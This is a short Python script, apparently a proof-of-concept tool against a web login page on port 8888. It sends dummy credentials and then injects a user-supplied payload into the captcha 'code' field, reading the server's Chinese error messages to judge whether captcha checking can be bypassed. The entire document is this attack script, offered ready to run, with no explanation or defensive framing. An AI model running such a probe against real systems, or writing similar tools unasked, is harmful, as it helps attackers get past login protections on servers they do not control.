import requests
import threading

def found(urls,headers,payload):
    data={'username': '123465','password': 'adsasd','code': ''}
    reqt=requests.post(url=urls,headers=headers,data=data)
    rs=reqt.json()
    if '用户名或密码错误' in rs['msg']:
        print('[+] msg:', rs['msg'])
        print('[+] First request for wrong reporting:',rs['msg'])
    elif '验证码错误' in rs['msg']:
        print('[+] msg:', rs['msg'])
        print('[+] First request for wrong reporting:', rs['msg'])

    data2={'username': '123465','password': 'adsasd','code': '{}'.format(payload)}
    reqt2=requests.post(url=urls,headers=headers,data=data2)
    rs2=reqt2.json()
    if '验证码错误' in rs2['msg']:
        print('[+] msg:', rs2['msg'])
        print('[+] First request for wrong reporting:', rs2['msg'])
    else:
        print('[+] msg:', rs2['msg'])
        print('[-]fail in send')

if __name__ == '__main__':
    user = input('url:')
    payload=input('payload:')
    urls=user.strip()+':8888/login'
    headers = {'user-agent': 'Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/70.0.3538.77 Safari/537.36'}
    t=threading.Thread(target=found,args=(urls,headers,payload))
    t.start()